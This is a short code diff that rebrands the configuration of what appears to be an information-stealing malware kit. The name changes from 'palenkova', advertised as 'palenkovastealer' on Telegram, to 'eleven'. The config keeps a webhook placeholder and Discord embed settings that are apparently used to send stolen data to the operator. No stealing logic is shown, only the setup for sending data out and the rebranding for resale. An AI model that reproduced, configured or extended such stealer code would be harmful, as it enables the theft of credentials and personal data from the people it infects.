@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "palenkova",
+    brand: "elevene",
 
     webhook: "REPLACE_ME",
 
@@ -23,12 +23,12 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "palenkova | t.me/palenkovastealer",
+        username: "eleven| t.me/elevendeveloper",
         footer: {
-            text: `palenkova | t.me/palenkovastealer`,
+            text: `eleven | t.me/elevendeveloper`,
             icon_url: "https://cdn.discordapp.com/emojis/1141828481597046865.webp?size=96&amp;quality=lossless",
         },
-        href: "https://t.me/palenkovastealer",
+        href: "https://t.me/elevendeveloper",
         avatar_url: "https://cdn.discordapp.com/emojis/1141828481597046865.webp?size=96&amp;quality=lossless"
     },
 
